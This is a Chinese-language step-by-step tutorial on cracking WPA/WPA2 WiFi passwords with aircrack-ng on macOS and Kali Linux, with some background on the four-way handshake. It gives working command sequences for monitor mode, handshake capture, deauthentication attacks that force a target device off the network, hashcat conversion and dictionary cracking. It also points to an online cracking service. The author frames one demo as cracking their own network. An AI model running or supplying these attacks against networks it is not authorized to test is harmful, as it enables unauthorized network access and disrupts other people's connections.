> 两个系统的使用方式，密码设置真的要花点心思
# aircrack-ng(mac)

### 1.install

```bash
brew install aircrack-ng
# 可能需要 安装macport， 安装Xcode、依赖
# brew install autoconf automake libtool openssl shtool pkg-config hwloc pcre sqlite3 libpcap cmocka
```

### 2.ifconfig命令查看网卡信息

![https://s3-us-west-2.amazonaws.com/secure.notion-static.com/63c78cd1-3e8f-421b-b37b-01dcf6d4124f/t2.png](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/63c78cd1-3e8f-421b-b37b-01dcf6d4124f/t2.png)

### 3.airport查看网络

```bash
sudo /System/Library/PrivateFrameworks/Apple80211.framework/Versions/Current/Resources/airport -s
```

![https://s3-us-west-2.amazonaws.com/secure.notion-static.com/52134e93-5b62-46ba-8c7d-003aecb23a3f/t1.png](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/52134e93-5b62-46ba-8c7d-003aecb23a3f/t1.png)

### 4.抓包

# en0默认网卡，6监听频道

```bash
sudo /System/Library/PrivateFrameworks/Apple80211.framework/Versions/Current/Resources/airport en0 sniff 6
```

![https://s3-us-west-2.amazonaws.com/secure.notion-static.com/636dc95e-02d1-453e-bc9d-db4960c36c96/t3.png](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/636dc95e-02d1-453e-bc9d-db4960c36c96/t3.png)

当执行以上命令， 开始监听以后， **wifi**的图标会**发生改变**， 变成一个小眼睛一样的图标。监听久一点， 然后使用**ctrl+c**停止监听， 系统会把监听到的数据保存到本地， 如下图， 数据保存到**/tmp/airportSniffdaMCjH.cap** 文件中

### 5.查看cap文件

```bash
sudo aircrack-ng   /tmp/airportSniff8g0Oex.cap
```

![https://images2015.cnblogs.com/blog/497865/201701/497865-20170108231500300-323707699.png](https://images2015.cnblogs.com/blog/497865/201701/497865-20170108231500300-323707699.png)

如果要查询的路由列表的Encryption值为WPA(1 handshake) ，说明抓取成功， 否者跳到第六步，要重新抓取

### 6.air-crack开始破解

```bash
sudo aircrack-ng -w password.txt -b 30:91:76:9e:2c:69 /tmp/airportSniffdaMCjH.cap
# -w：指定字典文件；－b：指定要破解的wifi BSSID。
#-b后面的参数bc:46:99:df:6c:72指的是网卡的BSSID， 最后面的一个文件路径是上一步监听到的数据
```

![https://s3-us-west-2.amazonaws.com/secure.notion-static.com/a632b3c8-a745-484a-a04a-4ec7d147c5c0/t6.png](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/a632b3c8-a745-484a-a04a-4ec7d147c5c0/t6.png)

### 7.cap文件缩小

```bash
#hcxpcaptool显示pcap / pcapng文件的信息，并将其转换为hashcat和Ripper接受的其他hashformat。 它将转换并清理您的文件：

hcxpsktool -o new.hccapx original_file.cap

可以使用更多选项：
选项：
-o  ：输出hccapx文件（hashcat -m 2500/2501）
-O  ：输出原始的hccapx文件（hashcat -m 2500/2501）
-X  ：输出hccap文件（hashcat -m 2500）
-X  ：输出原始的hccap文件（hashcat -m 2500）
-z  ：输出PMKID文件（hashcat hashmode -m 16800）
-Z  ：输出PMKID文件（hashcat hashmode -m 16801）
-j  ：输出john WPAPSK-PMK文件（john wpapsk-opencl）
-J  ：输出原始John WPAPSK-PMK文件（john wpapsk-opencl）
-E  ：输出单词表（启用自动十六进制）用作cracker的输入单词表-一世  ：输出未排序的身份列表
-U  ：输出未排序的用户名列表
-P  ：输出可能的WPA / WPA2 plainmasterkey列表
-T  ：输出管理流量信息列表：欧洲日期：时间戳记：mac_sta：mac_ap：essid
-H  ：以十六进制输出转储原始数据包
-V：详细（但较慢）状态输出
-h：显示此帮助
-v：显示版本

--time-error-corrections =  ：最大允许时间间隔（默认值：600s）
--nonce-error-corrections = ：允许的最大随机数间隔（默认值：8）
                                  ：应该与hashcat中的值相同
--netntlm-out =              ：输出netNTLMv1文件（hashcat -m 5500，john netntlm）
--md5-out =                  ：输出MD5质询文件（hashcat -m 4800）
--md5-john-out =             ：输出MD5挑战文件（John Chap）
--tacacsplus-out =           ：输出TACACS +认证文件（hashcat -m 16100，john tacacs-plus）

消息对字段的位掩码：
0：MP信息（https://hashcat.net/wiki/doku.php?id=hccapx）
1：MP信息（https://hashcat.net/wiki/doku.php?id=hccapx）
2：MP信息（https://hashcat.net/wiki/doku.php?id=hccapx）
3：x（未使用）
4：无ap攻击（设置为1）-无需进行随机数错误更正
5：检测到LE路由器（设置为1）-仅在必要时对LE进行nonce-error-correction
6：检测到BE路由器（设置为1）-仅在必要时才进行nonce-error-correction
7：未检查重播计数（设置为1）-未检查重播计数，绝对需要进行nonce-error-correction
```

### 8.字典爆破

有些第三方的网站提供免费爆破，或者收费的爆破， [https://gpuhash.me/](https://gpuhash.me/)

### 9.相关原理

- **WPA/WPA2简介**

由于WEP中存在严重的安全漏洞，WIFI联盟制定了WPA和WPA2以取代WEP。其中WPA实现了802.11i的主要部分，提供了对现有硬件的向下兼容，被用来作为WEP到802.11i的过渡。之后的则WPA2完整的实现了整个IEEE 802.1i标准。WPA的根据应用场景的不同采用不同的认证方式，其中面对家庭或小型办公场所网络的WPA-PSK不需要专门的认证服务器，所有该网络中的设备通过使用同一个256-bit的密钥来进行认证。

- **WPA-PSK安全漏洞**

WPA-PSK认证中的四次握手被设计用来在不安全的信道中，通过明文传输的方式来进行一定程度上的认证，并且在设备之间建立安全信道。首先，**PSK会被转化为PMK**，**而PMK则在接下来被用于生成PTK**。PTK则会被分为若干部分，**其中一部分被称作MIC Key**，用来生成每一个包的Hash值来用于验证。WPA的安全问题与其认证过程所使用的算法关系不大，更多的是由于这一过程可以被轻易的重现，这就使得WPA-PSK可能遭受字典暴力攻击。

- **WPA-PSK攻击原理**

WPA-PSK攻击分为以下几个步骤：　　

1. 根据passphrase，SSID生成PMK，即PMK = pdkdf2_SHA1(passphrase, SSID, SSID length, 4096)　　

2. 捕获EAPOL四次握手的数据包，得到ANonce，SNonce等信息，用于计算PTK，即　　PTK = PRF-X(PMK, Len(PMK), “Pairwise key expansion”, Min(AA,SA) || Max(AA,SA) || Min(ANonce, SNonce) || Max(ANonce, SNonce))　　

3. 使用MIC Key计算EAPOL报文的MIC，即MIC = HMAC_MD5(MIC Key, 16, 802.1x data)　　

4. 将计算得到的MIC值与捕获到的MIC值对比，如果相同则破解成功。

- **WPA-PSK攻击难点**

WPA-PSK攻击的主要难点在于大量计算PMK所需要的计算量。一台普通的计算机通常的计算能力在500pmks/s，想要对8位的纯小写字母组合密码进行暴力破解所需要的时间为14年，所以想要破解WPA－PSK只有两种可能：1.用户使用了常见的弱密码；2.堆砌计算资源，获得超级计算机量级的计算能力。

# **aircrack-ng(kali)**

**使用工具：aircrack-ng、kali支持的无线网卡**

第一步：检查无线网卡插上后，是否识别

![https://s3-us-west-2.amazonaws.com/secure.notion-static.com/28efabd8-5c25-47ac-8fed-7b1cde5babf6/20201011093354261.png](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/28efabd8-5c25-47ac-8fed-7b1cde5babf6/20201011093354261.png)

第二步：airmon-ng check kill (我的理解是杀死有可能妨碍监听模式的进程)

![https://s3-us-west-2.amazonaws.com/secure.notion-static.com/e9c6bf34-6dbd-4a15-a0c9-d3421c7d6f51/20201011093435169.png](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/e9c6bf34-6dbd-4a15-a0c9-d3421c7d6f51/20201011093435169.png)

第三步：airmon-ng start wlan0 把无线网卡设置为监听模式

![https://s3-us-west-2.amazonaws.com/secure.notion-static.com/b1bf3505-8fd4-4f8f-80f8-c3ae155934d3/20201011093554376.png](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/b1bf3505-8fd4-4f8f-80f8-c3ae155934d3/20201011093554376.png)

第四步：airodump-ng wlan0 开启监听,确认目标，我们这里以DESKTOP-为例，
 CH表示的工作的信道

![https://s3-us-west-2.amazonaws.com/secure.notion-static.com/2e9991fe-dfa2-42a0-bc31-b443abf1d145/20201011093700839.png](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/2e9991fe-dfa2-42a0-bc31-b443abf1d145/20201011093700839.png)

第五步：对目标进行抓握手包，只要有设备重新连上这个WIFI，我们就能抓到握手包，但是一直等也不是办法，所以有了第六步

```bash
airodump-ng -c 1 -w ret --bssid A2:A4:C5:31:73:E7 wlan0mon
```

- c 1 表示信道1也就是目标的工作信道 -w ret 表示我们的结果将会存在ret文件里 –bssid A2:A4:C5:31:73:E7 表示目标的MAC地址 wlan0mon 表示监听的网卡

![https://s3-us-west-2.amazonaws.com/secure.notion-static.com/a70cacf9-52c1-4e85-b09d-10d61cef9128/20201011094421850.png](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/a70cacf9-52c1-4e85-b09d-10d61cef9128/20201011094421850.png)

第六步：强制使设备重连WIFI

```bash
aireplay-ng -0 10 -a A2:A4:C5:31:73:E7 -c CA:D0:15:1B:A0:F6 wlan0mon
```

10 表示发10个攻击包
 -a 表示WIFI的MAC地址
 -c 表示设备的MAC地址
 我们随便选一个把它强制断开WIFI，然后它会再自动连接这个WIFI
 我们就能拿到握手包

![https://s3-us-west-2.amazonaws.com/secure.notion-static.com/3820ec7f-817c-4c8e-85c9-6d21dc1e762d/20201011095047535.png](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/3820ec7f-817c-4c8e-85c9-6d21dc1e762d/20201011095047535.png)

这是我们拿到握手包后的截图

![https://s3-us-west-2.amazonaws.com/secure.notion-static.com/f4d467c0-7953-45d1-b89c-e098bef8f6d6/20201011095352489.png](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/f4d467c0-7953-45d1-b89c-e098bef8f6d6/20201011095352489.png)

第七步：开始暴力破解啦

```bash
aircrack-ng -w pwd.txt ret-01.cap
```

- w 表示指定的字典文件 ret-01.cap 是第五步我们指定的抓到的包存放的文件名**这个破解的速度还是非常可以的！！！**

![https://s3-us-west-2.amazonaws.com/secure.notion-static.com/5e99be77-9d3d-43f6-8af3-c5756bc0ed4c/20201011095943754.png](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/5e99be77-9d3d-43f6-8af3-c5756bc0ed4c/20201011095943754.png)

### 暴力破解概述

本文链接：[https://freeerror.org/d/161-kali-linux-aircrack-ng-wifi](https://freeerror.org/d/161-kali-linux-aircrack-ng-wifi)

穷举法是一种针对于密码的破译方法。这种方法很像数学上的“完全归纳法”并在密码破译方面得到了广泛的应用。简单来说就是将密码进行逐个推算直到找出真正的密码为止。比如一个四位并且全部由数字组成其密码共有10000种组合，也就是说最多我们会尝试9999次才能找到真正的密码。利用这种方法我们可以运用计算机来进行逐个推算，也就是说用我们破解任何一个密码也都只是一个时间问题

当然如果破译一个有8位而且有可能拥有大小写字母、数字、以及符号的密码用普通的家用电脑可能会用掉几个月甚至更多的时间去计算，其组合方法可能有几千万亿种组合。这样长的时间显然是不能接受的。其解决办法就是运用字典，所谓“字典”就是给密码锁定某个范围，比如英文单词以及生日的数字组合等，所有的英文单词不过10万个左右这样可以大大缩小密码范围，很大程度上缩短了破译时间

破解wifi密码操作步骤

需要最少两个终端来实现，以下分别称之为shell 1 和shell 2

Shell 1 通过aircrack-ng 工具，将网卡改为监听模式

Shell 1 确定目标WiFi 的信息，比如mac 地址和信道，连接数等等

Shell 2 模拟无线，抓取密码信息

Shell 1 确定目标用户，对其发动攻击

Shell 2 得到加密的无线信息并进行破解(通过密码字典) 步骤就是这样了，接下来我来破解下自己的WiFi

WiFi密码破解步骤演示

**开启无线网卡的监听模式，电脑内置的或者外置的都可以** 

```
root@kali:~# airmon-ng start wlan0
```

这里要注意的，在开启监听模式之后，wlan0 这个网卡名称现在叫wlan0mon(偶尔也会不变，具体叫什么看上图的提示)

**扫描目标WiFi** 

```
root@kali:~# airodump-ng wlan0mon
```

注意现在的连个方框（红色和蓝色区域），现在我们要确认一些信息，及目标AP（就是WiFi，以下简称AP） 的MAC 地址，AP 的信道和加密方式，还有目标用户的MAC地址，我们稍微整理一下： 蓝色区域：目标AP的MAC地址（WiFi路由器的） 红色区域：目标用户的MAC地址（我的手机的） CH（信道）：1 加密方式：WPA2 我们只需要这些信息就足够了

**模拟WiFi 信号** 

```
root@kali:~# airodump-ng --ivs -w wifi-pass --bssid 1C:60:DE:77:B9:C0 -c 1 wlan0mon
```

–ivs ：指定生成文件的格式，这里格式是ivs（比如：abc.ivs） -w ：指定文件的名称叫什么，这里叫wifi-pass –bssid ：目标AP的MAC地址，就是之前蓝色区域的 -c ：指定我们模拟的WiFi的信道，这里是1 敲下回车后会看到这样的一段信息，这就说明我们模拟的WiFi 已经开始抓取指定文件了，不过要注意红色箭头的位置，如果想这样一直是空的就是没有抓到需要的信息，如果抓到了看下图，可以对比出来

**攻击指定的用户** 这里使用另一个空闲的终端，执行以下命令 

```
root@kali:~# aireplay-ng -0 20 -a 1C:60:DE:77:B9:C0 -c 18:E2:9F:B0:8B:37 wlan0mon
```

-0 ：发送工具数据包的数量，这里是20个 -a ：指定目标AP的MAC地址 -c ：指定用户的MAC地址，（正在使用WiFi的我的手机） 攻击开始后就像这样～

**得到密码文件并破解**  注意红色箭头指向的位置，如果在发送攻击数据包之后出现了图片里的信息，那么就是密码信息抓取成功了，如果出现了这个的话就可以结束WiFi 模拟了，我们可以按Ctrl+C 然后查看当前目录会发现多了一个wifi-pass-01.ivs 文件，我们想要的密码就在这个文件里，不过是加密的，所有我们还需要通过密码字典把密码破解出来

**指定密码本来破解此文件** 

```
root@kali:~# aircrack-ng wifi-pass-01.ivs -w /root/pass-heji.txt
```

-w ： 指定密码字典（比如我的在/root下，所有多了绝对路径） 这里看到红色箭头的位置就是密码了，到这里密码破解就完成了~
